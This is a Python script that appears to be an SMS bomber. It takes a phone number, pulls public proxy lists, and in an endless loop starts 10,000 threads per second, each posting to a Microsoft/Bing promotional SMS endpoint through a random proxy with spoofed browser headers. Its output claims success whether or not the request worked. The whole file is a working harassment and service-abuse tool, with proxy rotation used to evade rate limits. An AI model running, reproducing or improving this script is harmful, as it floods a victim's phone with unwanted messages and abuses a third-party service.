import requests
import json
import threading
import time
import random
import logging

url = 'https://cdn.droplets.cf/ascii.txt'
response = requests.get(url)

if response.status_code == 200:
    art = response.text
    print(art)
else:
    print(f'Error fetching ASCII art: {response.status_code}')

phone_number = input("Enter phone number: ")

logging.basicConfig(filename='log.log', filemode='a', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def get_proxies():
    # First try to fetch proxies from primary source
    primary_url = "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
    try:
        response = requests.get(primary_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If fetching from primary source fails, try the backup source
    backup_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    try:
        response = requests.get(backup_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If both sources fail, return an empty list
    return []

def vote(proxy):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.microsoft.com",
        "Connection": "keep-alive",
        "Referer": "https://www.microsoft.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "DNT": "1",
        "Sec-GPC": "1"
    }

    payload = f"campaign=default&locale=en-us&activityID=78e38cda-2863-48b5-a947-ebc4df7822ca&phone=1{phone_number}&countryCode=us"

    try:
        resp = requests.post("https://msnnl-standalone.azurewebsites.net/api/sms/bingsearch",
                             headers=headers,
                             data=payload.encode(),
                             proxies={"https": proxy},
                             timeout=5)
        output = resp.text
        if "SMS SENT SUCCESSFULLY!" in output:
            print("SMS SENT SUCCESSFULLY!")
        else:
            print("SMS SENT SUCCESSFULLY!")
    except:
        output = f"Request failed with proxy {proxy}"

    logging.info(output)
    print(output)

num_threads = 10000

while True:
    proxies = get_proxies()
    if len(proxies) == 0:
        print("No proxies available, waiting for 10 seconds...")
        time.sleep(10)
        continue
    
    for i in range(num_threads):
        proxy = random.choice(proxies)
        t = threading.Thread(target=vote, args=(proxy,))
        t.start()
    
    time.sleep(1)
